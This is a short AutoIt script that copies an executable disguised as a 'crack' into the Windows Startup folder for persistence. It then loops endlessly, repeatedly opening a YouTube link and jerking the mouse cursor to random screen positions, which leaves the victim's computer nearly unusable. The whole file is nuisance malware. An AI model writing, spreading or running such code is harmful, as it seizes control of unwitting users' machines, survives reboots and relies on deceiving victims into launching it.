Func MoveToStartup()
    ; Get the script directory
    Local $scriptDir = @ScriptDir

    ; Specify the source and destination paths
    Local $sourcePath = $scriptDir & "\aw_priv_crack.exe"
    Local $destinationPath = @StartupDir & "\aw_priv_crack.exe"

    ; Check if the source file exists
    If FileExists($sourcePath) Then
        ; Move the file to the destination
        FileMove($sourcePath, $destinationPath, 1)
    EndIf
EndFunc

MoveToStartup()

Func Veros()
    Local $lastShellExecuteTime = 0

    While 1
        ; Execute ShellExecute code every 10 seconds
        If TimerDiff($lastShellExecuteTime) >= 10 Then
            ShellExecute('https://youtu.be/kK7uljnAmQI')
            $lastShellExecuteTime = TimerInit()
        EndIf

        $x = Random(0, @DesktopWidth, 1)
        $y = Random(0, @DesktopHeight, 1)
        MouseMove($x, $y, 0)
        Sleep(100)
    WEnd
EndFunc

Veros()

While True
    Sleep(20)
WEnd
